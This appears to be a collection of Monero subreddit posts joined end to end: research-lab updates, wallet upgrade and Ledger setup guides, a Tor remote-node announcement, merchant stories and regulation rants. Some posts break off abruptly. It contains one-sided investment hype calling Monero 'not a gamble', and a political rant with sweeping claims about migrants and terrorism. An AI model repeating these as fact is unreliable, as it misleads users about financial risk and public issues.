- Monero technological features are so impressive that they meet the goal of fungibility without exception. Other, better technologies exist but they do not allow for easy, quick, efficient transactions. The potential of Kovri to enhance this even more is phenomenal. With the Monero Research Lab and network upgrades scheduled every 6 months for the foreseeable future, we can rest assured the protocol will continue to outpace and/or keep up with finding the sweet spot between technological advancement and practical, efficient, secure, private transactions.
- Monero is everything that Satoshi Nakamoto set out to create - and more.
- Monero is the only project with members and leaders who actively promote it’s ability to safeguard fundamental human rights
- Monero is just in the beginning stages of bringing it’s product to merchants and business. Once it is wide-spread we will have met our mission.
- Monero has only had an Outreach workgroup for a few months. Before it there was very little emphasis on finding innovative ways to introduce Monero to the mainstream. The foundation has been set and Monero Outreach is gearing up for some exciting projects to enhance the Monero ecosystem and support wider adoption 
- The list definitely goes on. Add more in the comments.

Monero is not a gamble, it’s a sound investment and a sound way to store and transact value. As the gamblers would say, right now is the time to “double-down” on Monero.  Learn more:

"I sell sterilized grain, it's a product for growing mushrooms. I sell it for Monero - and an odd amount of customers are happy to pay via Monero since I give them a nice discount, and the customers often have cryptocurrency already.  

I also advertise on the shroomery.org. The Shroomery can't accept Paypal and CC processing is expensive for them, but they do accept Monero. :) 

So:
I have customers who pay me in Monero, and then I use that Monero to pay the shroomery. It's cheaper and lower risk then any other option for everyone. 

And who knows where my mushroom growing customers will be getting their monero from in the future. ;)

*Surae's End of November (2017!) Update*



Hello, everyone! Sarang posted his update a few days ago to give the community time to review his work before the end of the month. I was hoping to finish multisig off before the end of this month... so I held off on writing this update until then... but it looks like I'm somewhere between 2 days and a week behind on that estimate. 

**MRL Announcements**

*Meetings.* We are holding weekly meetings on Mondays at 17:00 UTC. Logs are to be posted on my github soon(tm). Usually we alternate between ""office hours"" and ""research meetings."" At office hours, we want members of the community to come in and be able to ask questions, so we are considering opening up a relay to the freenode channel during office hours times, unless things get out of hand.

*POW-Difficulty Replacement Contest.* Some time in December, I am going to formalize an FFS ""idea"" to open up a multiple-round contest for possible replacements for our proof of work game. The first round would have a 3- or 6-month deadline. Personally, I would love it if this FFS could have an unbounded reward amount. If the community is extremely generous, we could easily whip up a large enough reward to spur lots and lots of interest across the world.

The Bitcoin POW game uses SHA256 to find nonces that produce hashes with sufficiently small digests according to the Bitcoin difficulty metric. Our current POW game uses CryptoNight to find nonces that produce hashes with sufficiently small digests according to the CryptoNote difficulty metric. The winner need not be proof of work. My current thoughts are roughly this:

All submissions will be public. Submissions that minimize incentives for centralized mining (or maximize disincentives) will be preferred over submissions that do not. Submissions that are elegant will be preferred over submissions that are not. Submissions that have provable claims about desirable properties will be preferred over submissions that do not (e.g. for either the Bitcoin or 
the Monero POW games, the necessary and sufficient network conditions for these games to produce blocks in a Poisson process have not been identified, to my understanding). Submissions that have a smaller environmental impact will be preferred over submissions that have a larger impact. And so on. I would like as many ideas as possible about a judging rubric for the first round. Especially if
a large amount of money will be put up as a prize. 

The details of the next round would be announced along with the winners of the first round. The reward funds should be released when a set of judges agree on a winner. MRL and Monero Core should each have representation on the panel of judges, and there ought to be at least one independent judge not directly associated with the Monero Project, like Peter Todd, Tim Ruffing, or someone along those lines. But, again, this is just an idea. If the community doesn't like it, we can drop it.

**Here is a rundown for November**

*Multisig.* Almost done. I know, I know, it's been forever. We, as a community, have recently come to see how important it is to carefully and formally ensure the correctness of our schemes before proceeding. Multisig is a delicate thing because a naively implemented multisig can reveal information about the participants. 

I'm finishing vetting key creation today, finishing signatures tomorrow and the next day. Then I'm passing the result off to moneromooo and luigi to ensure that my description of their code is accurate up to their understanding. Then onto Sarang for final reviews before submission, hopefully by the end of the month. I have my life until Sunday evening blocked off to finish this. A copy of the document will be made available to the community ASAP (an older version is on my github), after more checking and writing is completed.

This whitepaper on multisig will be broken into two papers: one will be intended for peer review describing multi-ring signatures, and one will be a *Monero Standard.* More about that later...

*RTRS RingCT column-linkability and amortization.* You may say ""what? I thought we were putting RTRS RingCT on the back burner?"" Well, I'm still think ing about amortization of signatures. I'm thinking it will be possible (although perhaps not feasible) for miners to include amortized signatures upon finding new blocks. This would allow users to cite an amortized signature for fast verification, but has some possible drawbacks. But more exciting, I'm also chatting with Tim Ruffing, one of the authors on the RTRS RingCT papers: he thinks he has a solution to our ""linkability by columns"" problem with MLSAG and RingCT.  Currently we try to avoid using more than one ring signature per recipient. This avoids linking distinct outputs based on bundling of these ring signatures. Ruffing believes RTRS RingCT can be tweaked to prove several commitments in a vector of commitments; this would allow a single RTRS RingCT to be computed and
checked for each output being spent.

Once all the details are checked, I'll write up a document and make a copy of it available to the community. If it works, of course. 

*Consequences of bulletproofs.* In my last end-of-month update I hinted at issues with an exponential space-time trade-off in RTRS RingCT. Due to the speed and space savings with bulletproofs, it may now be feasible to implement RTRS 
RingCT. With improved verification time savings with bulletproofs we can relax our requirements for verification times for signatures. This will allow the slightly longer verification times of RTRS RingCT to be counter-acted. Solving 
the problem ""what ring sizes can we really get away with?"" involves some modeling and solving some linear programming problems (linear programming, or linear optimization, is an anachronistically named area of applied mathematics 
involved with optimizing logistic problems... see [here](https://en.wikipedia.org/wiki/Linear_programming)
for more information). 

Hence, we will be inserting bulletproofs into Monero with low friction, and then we will look into the logistics of moving to RTRS RingCT.


*Monero Standards.* Right now, we don't have a comprehensive list of how Monero works, all the various primitives and how they all fit together. Sarang and I have begun working on some Monero Standards that are similar to the original Cryptonote Standards (see [here](https://cryptonote.org/cns/cns006.txt) for more information). For each standard, from our hash function on upward, we will
describe the standard, provide a justification for Monero's choices in those standards (complete with references), as well as a list of possible replacement standards. For example, our Monero RingCT Standard should describe the RingCT scheme described by shen, which is essentially a ring signature with linear combinations of signing keys + amount commitments. Under the ""possible replacements"" section, we would describe both the RTRS RingCT scheme and the doubly efficient zk-snark technology as two separate options.

These standards may take awhile to complete, and will be living documents as we change the protocol over the years. In the meantime, it will make it dramatically easier for future researchers to step into MRL and pick up where previous researchers have left off.


*Hierarchical view keys.* Exploiting the algebra we currently use for computing one-time keys, the sub-address scheme plays with view keys in a certain way, allowing a user to have one single view key for many wallets. Similarly, we may split a view key into several shares, where each subset of shares can be used to grant partial view access to the wallet. A receiver can request that a sender use a particular basepoint in their transaction key where different subsets of shares of the view key grant access to transactions with different basepoints in their transaction keys.  None of these are protocol-level observations, they are wallet-level observations. Moreover, these require only that a receiver optionally specify a basepoint. 

In other words: hierarchical view keys are a latent feature of our one-time address scheme that has not seen specific development yet. It's a rather low priority compared to the other projects under development; it grants users fine-grained control over their legal compliance, but Monero Standards will have great long-term impact on development and research at Monero.

*Criticisms.* Monero has suffered some recent criticisms about our hash function. I want to briefly address them.

First, I believe part of the criticism came from a confusion between Keccak3, SHA-3, and Keccak: we have never claimed to use SHA-3 as our hash function, we have only used the Keccak3 hash function, which is a legacy choice inherited from the original CryptoNote reference code. Many developers confuse the two, but Keccak3 was the hash function on which SHA-3 is based. In particular, the 
Keccak sponge construction can be used to fashion lots and lots of primitives, all of which could fairly be called ""Keccak:"" both Keccak3 and SHA-3 are Keccak constructions. This may be a subtle nomenclature issue, but it's important because a good portion of our criticisms say ""Hey, they aren't using SHA-3!""

Second, I believe part of the criticism also comes from our choice of library, which in my opinion isn't a big deal as long as the library does what it says on the tin. In this case, our hash function is a valid implementation of Keccak3 according to the Keccak3 documentation. The most important criticism, from my point of view, is our choice of pre-SHA-3 Keccak3 as our hash function. Keccak3 underwent lots of analysis during the SHA contest, and Keccak3 is a well-vetted hash funtion. However, it has not been 
chosen as an international standard. There is a sentiment in the cryptocurrency community to distrust standards, which is probably a healthy sentiment. In this case, however, it means that our choice of hash function is not likely to be
supported in common, well-vetted libraries in the future. Moreover, since SHA-3 is an international standard, it shall be undergoing heavy stress testing over the coming decades, a benefit Keccak3 shall not enjoy.

Last month, after some discussions, we made changes to our choice of PRNG in Monero to match the PRNG for Bitcoin. There has since been some discussions instantiated by anonimal about this choice of PRNG. We at MRL are doing our best to assist the core team in weighing the relative costs and benefits of switching to a library like crypto++, and so we believe these criticisms fall into the same
category. We intend to address these issues and make formal recommendations in the aforementioned Monero Standards. Sorry for using the word aforementioned.

**Things that didn't move much** include a) educational outreach, b) SPECTRE, c) anti-ASIC roadmap, d) refund transactions. Most of which was on hold to complete multisig. 

As far as educational outreach, I contacted a few members of a few math/cs depts at universities around me, but I haven't gotten anything hopeful yet. I wanted to go local (with respect to me) to make it easier to organize, but that's looking less likely. No matter how enthusiastic of a department we find, garnering participation from faculty members, beginning an application process for new
students, squirelling up funding, working out logistics of getting teachers or lecturers/speakers from point A to point B, where to stash students, etc would be a challenge to finish before, say, July. And some schools start their fall semesters in mid-August. So I'm thinking that Summer 2019 is reasonable as the first Monero Summer School... and would be a real fun way to finish off a two-year post-doc!


**December plan.** I am going to finish multisig, and then finish the zk-lit review with Jeffrey Quesnelle, since these are both slam dunks. Any other time in December I have will be devoted to a) looking into the logistics of using the bulletproofs + RTRS RingCT set-up, b) reading the new zk-stark paper and assessing its importance for Monero, c) beginning work on Monero Standards, which includes addressing our hash function criticisms, our PRNG, etc. 

*Thank you again!* This is an incredible opportunity, and this community is filled with some smart cookies. Every day is a challenge, and I couldn't ask for a more fun thing to be doing with my life right now. I'm hoping that my work ends up making Monero better for you."

"If you're watching your monerod logs you've seen a lot of astonishingly deep mining forks the last few days.  Below is one from a few minutes ago, eight blocks deep.  Two possibilities:

1. Somebody with a ton of hashpower is perpetrating a double-spend attack.  Eight blocks is more than enough to get paid from xmr.to, which went offline recently.  Probably enough for many exchanges as well.

2. One of the pools has serious network connectivity issues, as a result of which it is now definitely insolvent (eight blocks = $8648 and there have been a very large number of these mining forks).

"From the Wikipedia Page:

""Monero was launched on 18 April 2014 originally under the name BitMonero, which is a compound of Bit (as in Bitcoin) and Monero (literally meaning coin in Esperanto). Five days later the community opted for the name to be shortened just to Monero. It was launched as the first fork of CryptoNote-based currency Bytecoin...""

So our little HoneyPony turns 3 today, congratulations!

How far it has come in just three short years, imagine where we will be on April 18, 2020... :) "

"I'm sure this surge won't last but, my XMR holdings hit a million USD today... I was a relatively early adopter, bought a lot at around 45 cents. Every time it dropped I just bought more.

So many mixed emotions.

Doesn't feel real. 

Literally just a number on my phone.

More fear than I was expecting.

I haven't told literally a single person IRL.

Never really talked about XMR to anybody since I go that out of my system with Bitcoin, so my friends and family literally have no inkling.

No intention to sell but, any advice for people dealing with sudden wealth?

I never cared much for money. I just want to be fabulous."

> Starting from June 1 payment in cash in North Macedonia will be limited up 30,000 Macedonian Denar (MKD) in the local currency value (around 500 euros, or 560 U.S. dollars), North Macedonia's Finance Minister Dragan Tevdovski told reporters on Friday.

> According to the new law ""On money laundering and terrorism financing"" passed in the parliament, North Macedonian citizens can not make purchases in cash if the amount surpasses 30,000 MKD.

> ""The government has decided to lower cash payment limits aiming to reduce shadow economy,"" Tevdovski said.

Cashless society coming to your neighborhood. This is exactly why we need cryptocurrencies. 

You might say: _this is fine_, I'll have my money on a bank card or Apple Pay app. _""This changes nothing in my life, I'm a law abiding citizen, I don't do crimes, I have nothing to hide.""_ But you'd be very wrong. Your own wealth will exist only in the crony corporate capitalist cloud (your data is already there), and when this umbilical cord between you and them is severed, you will stop existing as a person. Back to dark age, back to serfdom.

You think the government is here to help? The state cares about their citizens? **NO.** I highly recommend you to watch this movie: [I, Daniel Blake](https://www.imdb.com/title/tt5168192/), it completely describes the state of the world today and what awaits **every single one of us** at some point if things continue the way they've been going for the last 50+ years. Pirate that movie off torrents if you need to. I know at least a half of all US families have no more than $500 of savings (that alone is simply outrageous), and having to pay for quality information is just a road to mass ignorance."
"Merry Christmas to everyone except for people that own DASH, Verge or Zcash :)"
"This is based off all blocks starting from 1545600 (400 blocks away from fork). This will potentially mean that the compute available after the fork is 1/5 what the network thinks, with very slow blocks coming up while it adjusts to the true hash rate.

I've made a pull request to Monero (https://github.com/monero-project/monero/pull/2887) with a difficulty algorithm (originally from the Masari project) that is much more responsive and solves problems that Monero had in the last fork and in this coming fork. Whether it's this algorithm or something else, we need the currently outdated difficulty algorithm in Monero to change for future protocol upgrades.

Discourse on this subject matter is welcome.

edit: some chain-forked projects (i.e. XMC) have used this statistic in false attempt to legitimize it, and to be clear this post is only intended to address the difficulty algorithm in place when dealing with large hash rate fluctuations caused by ASIC centralization or outdated botnets."

EDIT: added more help about the importance of the mnemonic seed => Version 1.0.1"
"The very notion of governments banning privacy coins seems like nonsense for the most part. They can't ban a particular coin because a fork could just be created. They can't ban the underlying tech either. How do you ban RingCT, stealthaddresses, zksnarks, etc.? It wouldn't be possible.

Not to mention we saw how the previous attempted ban on cryptography went. 

In addition, the supposed motivation behind any ban would be to prevent the use of using ""untraceable"" cryptocurrencies due to their illicit use in money laundering and tax evasion. But in order for any crypto to be used in money laundering or tax evasion, you'd still need a crypto --> fiat gateway where you could cash out large amounts of money while avoiding detection/identification, and currently, there's no quick, solid, efficient way to do that. 

To be sure, govts aren't worried about normies getting away with a $1k tax-free profit on cryptos; they're worried about the big players who want to cash out 6 figures without paying taxes. But people who have that kind of cash don't need to cash it out in places like the US. 

They'll establish residency in a place like Puerto Rico which currently has an agreement with the US government such that if you establish residency there, you don't need to pay capital gains taxes. 

Privacy coins aren't the keystone to tax evasion and money laundering. "
"As you all know, we have a very exciting hard fork coming up at the end of March. With this hard fork, Monero is changing its proof of work in an effort to fight against the trends of centralization that are, perhaps, inherent to proof of work systems. Perhaps they are inherent to anything humans set their eye on - attempting to bring order and efficiency to a world borne of chaos, centralization is almost the logical progression of any human designed system if its nature isn't constantly refined. 

It's fascinating, really. Almost like how all goes from order to disorder, perhaps there is some other law that humans somehow absentmindedly adhere to which drives centralization of All The Things. We can see it in our nation governance structures, in our mining networks, in our agriculture. In our computing infrastructure (... do you know how hard the hippies fought to have personal computers, and now we all throw our shit back on mainframes? Check [this out](https://www.amazon.com/What-Dormouse-Said-Counterculture-Personal/dp/0143036769) for a fun read) to our cryptocurrency networks ... all these things, the tendency is to bring order to the world and this almost always brings centralization along with it.

So it is outright fascinating that this new system, these cryptocurrency networks, must fight this innate human nature. But how do we make a system that can adjust for this? Accommodate for this shortcoming? These networks *must* remain decentralized - that is how they obtain their trustlessness, resiliency, immutability, censorship-resistance, and from these things their value - but every step along the way our logic brains insist that surely, it will be more efficient if we just build things that do this one thing. 

The perfect solution, i would argue, is currently beyond our grasp. But that does not mean that there's not a working solution. The PoW tweaking proposed and implemented by the Monero core team is a working solution, and by golly we're gonna see how it works. 

Anyway, this rambling tirade is a call to mine. No one has any idea how much hashrate will be on the chain after the fork. So if you are a small time miner - if you have some hardware thats been gathering dust ever since the hashrate spiked - get it running again. Make it work. You have less than 3 weeks to get your miners back in gear to fight the good fight. And hell, even if you don't have any mining gear, get your daemon solo mining. Who knows???? That first block could take much longer to find than anyone anticipates, and those extra minutes are extra time that you could find the nonce. "

"Following the previous thread, where I made [an appeal for more entrepreneurship](https://www.reddit.com/r/Monero/comments/7gr7ni/what_are_you_doing_with_your_monero_an_appeal_for/) inside the community, I decided that I wanted to explore this subject a little bit more with you.

A lot of the talk was around the idea of raising funds for a big project, and then developing it over time and giving it back to either investors and/or the community. This is a valuable idea and it’s one of the things that I at least believe the Monero developers have in mind with the creation of side chains and/or different layers.

But today I’m here to convince you that you don’t need to **start big**. If you have any skill in your life – and I’m pretty sure you do – then you should offer it, advertise it, and trade it for Moneroj.

Maybe this idea is too abstract, but the whole cryptocurrency scene is abstract in some point. It’s really important that you understand the magnitude and the scope of Monero in changing the way financial values are transferred throughout the globe. You’re part of a world-changing revolution, but “revolution” is meaningless if you’re not bringing a radical change in the way you are living.

But let’s get to the point: we need to start using Monero as the real cash it is. This is the whole point of the “don’t buy Monero” quote. You don’t buy it because you should use it. Now, you have to understand that in a transaction of any kind you have at least two entities: the part and the counterpart; the sender and the receiver. **I want you to be the receiver**. 

So, what are your skills? And how can you trade it for Moneroj? Let me give you some examples:

> You’re a software developer or web designer and you decide that you will now offer your services for **Monero first**. You can create designs, websites, frameworks, front-end, back-end, whatever. And when you bill your client you tell him that he has a 15% discount if he pays using Monero. You can take this idea to the next level if you sell themes or plugins directly from your website by adding Monero as a payment method directly on the eCommerce.

----

> Start an eCommerce that accepts Monero. This is pretty much straightforward. If you already have an eCommerce, why you’re not accepting Monero as a payment method? You have [GloBee](https://globee.com/) and the [Monero Integrations](http://www.monerointegrations.com/) to start accepting Monero today. Give discounts. Promote it on your website. If you don’t know how to start an eCommerce of pretty much **anything you want to sell** then just search the internet for “dropshipping”. You could be the owner of an eCommerce in literally 48 hours with minimal investment (or no investment at all if you’re technologically literate). Find a niche. Find products you would like to sell. Open a store that is all about Monero. What do you think the community will do? Think about it.

----

> If by some chance you’re a lawyer or an accountant, couldn’t you help by developing open source guides on how people should go on complying with federal laws and taxes? The most common complaint I get from physical store owners is that they don’t know how to declare these. This information is scattered and not clear at all. Offer guides online, for free, and then offer private consultations where people can pay with Monero for further guidance.

----

> You make the best lemonade in the whole universe. Sell lemonade on the street and offer the second cup for free if people pay using Monero. I’m not joking. This kind of exposure is important because people can see that Monero is real money and it’s meant to be used as such. Sell lemonades and have flyers (the same flyer [developed by the community](https://taiga.getmonero.org/project/sgp-monero-meetup-kit/) explaining Monero) available for anyone wanting to know more about what Monero is.

----

>You’re a guitar player and you play music on the street on the weekends. Add a big QR code of your Monero wallet  and let people donate with Monero. Not Ethereum. Not Bitcoin. Monero. And add a few flyers beside your QR code so people can understand what Monero is. If you’re really talented, write a song about Monero, cash, fungibility and play it on the streets. Be creative.

The bottom line is pretty simple: do you have any skills? Trade it for Monero. Who knows? Maybe your small project, your small eCommerce, your small anything becomes bigger. Maybe the community will love your business so much that it will explode with customers.

"This is the GUI v0.14.0.0 'Boron Butterfly' major release, which a user, service, merchant, pool operator, or exchange should run to be sufficiently prepared for the scheduled protocol upgrade of March 9 (for which more information can be found [here](https://www.reddit.com/r/Monero/comments/apkvym/asic_resistance_hashrate_discussion_thread/).  

**This version, *if using your own (local) node*, requires a database conversion, which may take 5-10 minutes and the GUI will show that it's `Disconnected` (or unable to connect) from the daemon (monerod). I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod).**

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero-gui/releases/tag/v0.14.0.0).

2. Extract the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux) you just downloaded) to a new directory of your liking. This is the easiest and recommended way. Alternatively, however, you can overwrite the old binaries.

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled network upgrade.  

4. If you're running a local node, the integrated daemon (monerod) will first have to convert your database to a new version. This may take 5-10 minutes and the GUI will show that it's `Disconnected`. I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod). 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`

(2) If, for some reason, the GUI doesn't automatically load your old wallet, you can open it as follows:

**[1]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[2]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off. However, to reiterate, a database conversion is required, which may take 5-10 minutes and the GUI will show that it's `Disconnected` from the daemon (monerod).

-------------------

# Release notes

- Revamped wizard

Note that the full release notes can be found [here](https://github.com/monero-project/monero-gui/tree/v0.14.0.0). 

# Further remarks

- If you need to use a long payment ID, you can re-enable the feature on the `Settings` page -> `Layout` tab. 
- Trezor support is not included in this release. However, it will, most likely, be included in the subsequent point release.
- A fix for the Ledger bug is included in this release.
- **Ledger Monero users are advised to only run GUI v0.14.0.0 in conjunction with Ledger Monero app v1.2.2.**
- Transaction history can sometimes not load. Changing the filters to the current date (or any date) solves it.
- Due to limited time, the GUI guide had not been fully updated yet and therefore we had to exclude it. It will be readded in the point release.

# Using the GUI with a remote node

In the wizard, you can either select `Simple mode` or `Simple mode (bootstrap)` to utilize this functionality. Note that the GUI developers / contributors recommend to use `Simple mode (bootstrap)` as this mode will eventually use your own (local) node, thereby contributing to the strength and decentralization of the network. Lastly, if you manually want to set a remote node, you ought to use `Advanced mode`. A guide can be found here:

"Hey all. I run a record label with a Wordpress -> WooCommerce installation for our storefront, and have been an avid proponent of cryptocurrencies for a few years. In addition to having the desire to sell vinyl records in exchange for Monero, I was fed up with losing money on every sale due to Paypal fees, so I developed a plugin for seamlessly accepting Monero at checkout on a shop owner’s WooCommerce store.

This plugin is the most minimal implementation I could imagine that didn’t rely on third-party payment processors, middlemen, or other libraries that tie you into a service or requires information about you or the user. Admittedly, I used Coin Market Cap’s price API to pull current prices and generate conversions to USD, but it was purely since they didn’t require any type of authorization/token system to use.

The plugin doesn’t do anything extra in terms of providing security or bells and whistles. It converts the cart total to XMR (and auto-updates every 60 seconds to pull the most current price), generates a QR code with the address, and allows the shop owner to set a percentage for a customer fee/discount for using this gateway. The order number is built-in to the converted price starting at the 10th decimal place for lack of a better system of keeping orders/payments linked.

"Hey folks,   
   
   
Given that phone wallets are just around the corner, allowing a new era of Monero real life payments, the time is right to allow **instant payments to Bitcoin accepting merchants**. [XMR.TO](https://xmr.to) will serve every order up to 0.1 BTC (currently) without any confirmation.  
On top of that:   
* we added **integrated addresses** for your convenience.   
* we increased the **maximum amount** to 20BTC.   
   
    
*****

*Note for developers:* a new version of the API (v2) is available, see the documentation [here](http://xmrto-api.readthedocs.io/en/latest/). We still support v1 so all apps and services that rely on it currently will function as usual. We recommend upgrading them to v2 to leverage integrated addresses and zero-confirmation orders.   
   
**Edit**: If you have issues or see glitches on the frontend, hard reload with shift+F5."
Happy to see 100k people in this sub! How long will it take for another 100k?
"By now you must have read about the recent and rather predictable news about the G20 conspiring together to regulate crypto.

I choose the word *conspire* carefully, because this is nothing short of the political elites getting together to legislate, not based on the interests of the citizens of the countries that these ""leaders"" allegedly represent.

As usual, the cover of anti money laundering and terrorism are used.

Curious though, isn't it - big banks keep on being let off with slaps on the wrist, the Pentagon has trillions of dollars unaccounted for, but all of that seems to matter very little, what is important is that Joe and Jane doe be forced to expose themselves to identity theft whenever they want to exchange crypto.

Remember Joe, it's for your own protection.

The old excuse of terrorism also fails to convince. These are the same people who *conspired* to bring millions of people into the old continent, without much background and security checking, with the predictable result that the previously unthinkable is now reality: grooming gangs, frequent stabbings, major European cities that have active *actual* terrorist cells within them.

Whoever these people are, and whoever they represent, it is not me, it is not you. They seek to control, divide and destabilize.

Who profits from a chaotic society with rampant insecurity and generalized fear?

Not you, not I.

But remember Jane, it is for your own protection. Just forget about Cologne, diversity is our strength. And anyway, you wouldn't want to be charged with *hate speech*, would you?

But back to Monero.

These developments will mean that what was previously a rather smooth experience - as smooth as the still evolving ecosystem allowed - will soon be littered with fabricated obstacles, not to protect you from terrorism or preventing money laundering (whatever that means), but to guarantee that the beast doesn't starve.

They sense some of the cows are finding a way out of the system.
They don't want that.


Whether you subscribe to this story or not, one thing I think we can really agree on.

Soon, services like xmr.to will be forced under the threat of violent armed men to identify all their customers. The experience we knew and loved will be gone.

If we want Monero to stay resillient and smooth, working on that Bisq and OpenBazaar integration seems like a good idea.

If the atomic swap idea can work with Monero that would also be interesting.

This shouldn't be a technological problem, but friends, our governments do not, in large measure, work on our behalf anymore - if you want some privacy and piece of mind, then you must be a criminal or at least have something (shady) to hide. Probably some sort of dissenter - and don't we all know these are always up to no good.

This is the sorry state of the situation right now.

Maybe one day it will change, maybe it will not. Seems to me that it might only when Joe and Jane are so very inconvenienced that they might start demanding some change - but the laws are quickly piling up against the average person - FATCA, CRS, KYC/AML, etc.

The very rich, of course, have the best and brightest available to nulify such laws, and this will remain the case.

In their myopic vision, all these crooks accomplish is screwing up the rest of us with an ever-tightening grip on freedom.

Unfortunately for us, crypto has - so far - failed to attract any sort of critical mass, and therefore laws that would result in crippling this nascent economy are likely to pass.

For while there have been zero cases of terrorism linked to crypto, and zero cases of large-scale money laundering, the community of international regulators, acting in their own interests and not representing the people, are already busy making rules about stuff they don't very well understand.

And even if there had been cases (it's only a matter of time, eventually it will happen, fabricated or not) - so what?

Are we collectively so brainwashed that we blindly accept the argument that just because something *could* conceivably be used for evil, it must be regulated to the moon and everyone must be under surveillance even though no crime has been committed?

It's madness.

I want to end by restating what led me to write this in the first place.

We might soon find ourselves in a situation where it is not possible to exchange XMR for other crypto unless we choose to ""voluntarily"" put our identity in the hands of strangers on the internet.

Since countering this politically seems unlikely to work right now, as the propaganda around terrorism and money laundering is overwhelming and society seems to have long ago (17 years and counting!) capitulated, we should think about how to ensure that we can continue to ensure our right to privacy.

How to spend XMR without having to sell our identity documents."
"There are an number of misconceptions about Zec security... they come to light as soon as you start using the coin.

Monero is true end to end Privacy .... from the time it hits your wallet until it leaves.  Once concealed transactions came online it is hard to argue Zero Knowledge is better.

Zec wallets are inferior. Zcash company only supports a Linux CLI..... and there is no guarantee Shielded will ever work on hardware wallets...

The only advantage Zec may have is speculative.... because Digital Currency group and Gemini are supporting it. \(we all enjoy those kind of gains.\) 

For the average user.... Monero is much better.... no back and forth from shielded to transparent...  

My Monero experience has been much better and the Monero reditt community is hands down far more knowledgeable about crypto privacy."
"The hashrate has increased significantly in the last week or so. Having a new thread about it every day is rather pointless though and merely clutters the subreddit. Therefore, I'd like to confine the discussion to this thread. "

"11th May: 
Updated to V12. 

I would like to announce I have launched a hidden tor service of my remote public node for Monero. You can use the .onion URL to access it and send a transaction through TOR. You can see if TOR or Monerod are running by visiting http://monero.nolog.network/ or http://mmp26upm3gig2ltk.onion

#Monero Tor Hidden Public Remote Node
You can use these details to connect over TOR. It provides access to TOR users to my public node by using the onion address for those who want even more privacy.

#####Address: **mmp26upm3gig2ltk.onion**
#####Port: **18089**
#####Location: London, United Kingdom.

###Note on using Monero with TOR.
>You should only use this to send transactions. It's recommended you have already downloaded the blockchain on another device and copied it using a USB and used the monero import tool for example otherwise it will take FOREVER to sync. 

# Monero Public Remote Node
If you want to connect without TOR please feel free to connect to the node normally using the details below.. 

#####Address: **monero.nolog.network**
#####Port: **18089**
#####Location: London, United Kingdom.

I host this remote node as I saw the lack of remote nodes, and decided to add TOR as why not? This is a high uptime server on an SSD. If it crashes you will need to wait for me to input the FDE password but uptime is typically very good.

If this has helped you upvote so it gets visibility! Can anyone who is running TOR with Monero confirm this is working, I have configured it correctly but there is no easy option to use TOR without using Tails of another virtual machine.

Example of using with Tails and Monero-CLI Linux 64bit. (just tested):

    torsocks monero-wallet-cli --daemon-host mmp26upm3gig2ltk.onion:18089 --restore-deterministic-wallet

--restore-deterministic-wallet lets you restore your 24 words, remove it if you want to create a new wallet.

If you want to donate any spare change you have in your XMR wallets as a thank you for running this service you can buy me a beer with my address details below.

"This may as well be just a rant, but I'm very thankful that XMR exists.

I have discovered BTC last year, and these scaling problems weren't too much, or I was just a noob, well whatever. I just sold all of my BTC for Monero three days ago, not BCH, because right now miners are mining the coin which is more profitable for them, and then switch if the other one's going to adjust difficulty. This ""attack on Bitcoin"" is getting out of hand, and I don't want to be a part of it.

On the brighter side, I've been accumulating XMR since it was $14 so I've already stacked a few. I just didn't know why I haven't done this earlier, maybe I was hoping BTC would fix itself, but when April (China ban bitcoin again?) came, though the price is climbing, the fees also were, and it never got better. Just fork after fork, I don't even know why people think it's a good thing that Bitcoin's price is at ATH because of a fork. No it's not. Bitcoin is going downhill. Well at least now I'm all here, where the noob me thought what Bitcoin was. Monero is, afterall, what Bitcoin should have been.

PS. I would also like to thank this community, you're the best! :)"

"# **Windows**

We first have to ensure that we're sufficiently prepared. This entails the following:

1. This guide assumes you have already initialized your Ledger wallet and thus generated a 24 word mnemonic seed. 

2. You need to run / use CLI v0.12.2.0, which can be found [here](https://github.com/monero-project/monero/releases/tag/v0.12.2.0).  

3. You need to install the Ledger Monero app. Instructions can be found [here](https://github.com/LedgerHQ/blue-app-monero/blob/master/doc/user/bolos-app-monero.pdf). In addition, make sure to set the network to `Mainnet` 

4. Your Ledger needs to be plugged in and the Ledger Monero app should be running. 

5. Either your daemon (`monerod.exe`) should be running and preferably be fully synced or you should connect to a remote node.

Now that we're sufficiently prepared, let's start!

1. Go to the directory / folder `monerod.exe` and `monero-wallet-cli.exe` are located.

2. Open a new command prompt / powershell. This is done by first making sure your cursor isn't located on any of the files and subsequently doing SHIFT + right click. It will give you an option to ""Open command window here"". If you're using Windows 10, it'll, most likely, give you an option to open the Powershell.

3. Now type:

    `monero-wallet-cli.exe --generate-from-device <new-wallet-name> --subaddress-lookahead 3:200` **(Win 7 + 8)**

    `.\monero-wallet-cli.exe --generate-from-device <new-wallet-name> --subaddress-lookahead 3:200` **(Win 10)**

Note that <new-wallet-name> is simply a placeholder for the actual wallet name. If you, for instance, want to name your wallet `MoneroWallet`, the command would be as follows:

`monero-wallet-cli.exe --generate-from-device MoneroWallet --subaddress-lookahead 3:200` **(Win 7 + 8)**

`.\monero-wallet-cli.exe --generate-from-device MoneroWallet --subaddress-lookahead 3:200` **(Win 10)**

4. The CLI will, after executing aforementioned command, prompt your for a password. Make sure to set a strong password and confirm it thereafter. 

5. The Ledger will ask whether you want to export the private view key or not. First and foremost, your funds cannot be compromised with merely the private view key. Exporting the private view key enables the client (on the computer - Monero v0.12.1.0) to scan blocks looking for transactions that belong to your wallet / address. If this option is not utilized, the device (Ledger) will scan blocks, which will be significantly slower. There is, however, one cavaet. That is, if your system gets compromised, the adversary will potentially be able to compromise your private view key as well, which is detrimental to privacy. This is virtually impossible when the private view key is *not* exported. 

6. You may have to hit confirm twice before it proceeds.

